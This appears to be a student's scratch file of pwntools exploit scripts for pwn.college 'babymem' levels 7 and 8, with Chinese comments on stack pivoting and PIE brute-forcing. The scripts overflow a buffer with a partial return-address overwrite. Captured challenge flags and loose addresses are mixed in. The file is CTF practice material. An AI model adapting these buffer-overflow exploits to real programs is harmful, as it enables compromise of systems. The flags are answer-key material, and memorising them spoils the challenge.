# 好像开了动态的话, 没有内存泄露, 得要用一些别的技巧了=。=
# 第七题, 要用到移栈技巧, 让rbp指向区域控制住, 然后重新第二次调用main函数
# 我得仔细想一下, 怎么控制rdi的值

from pwn import *

pro_name = "./babymem_level7_teaching1"

win = 0xa61a    # 要爆破第一位, 直接跳到函数内, 绕过传参
payload = b'A'*0x68+b'\x1a\xa6'

while True:
    io = process(pro_name)
    io.recvuntil(b"size: ")
    io.sendline(b'106')
    io.sendline(payload)
    a = io.recvall()
    #io.interactive()
    if io.poll() == -7:
        print(a)
        break


pwn_college{kwGNBvypQu6nq0iT7U9ZpSogc1E.dBTMywiMxkzW}
win = 0xa251

win = 0xa533



from pwn import *

pro_name = "./babymem_level8_teaching1"

win = 0xa61a    # 要爆破第一位, 直接跳到函数内, 绕过传参
payload = b'\xde\xad\xbe\xbf\x00\x00\x00\x00'+b'A'*0x50+b'\x33\x99'

while True:
    io = process(pro_name)
    io.recvuntil(b"size: ")
    io.sendline(b'98')
    io.sendline(payload)
    a = io.recvall()
    #io.interactive()
    #print(io.poll())
    #break
    if io.poll() == -7:
        print(a)
        break
pwn_college{k-j5LQXffbOG_SRr65-agNi4EUc.dNTMywiMxkzW}


0x18d9
0x137f
-0xa0
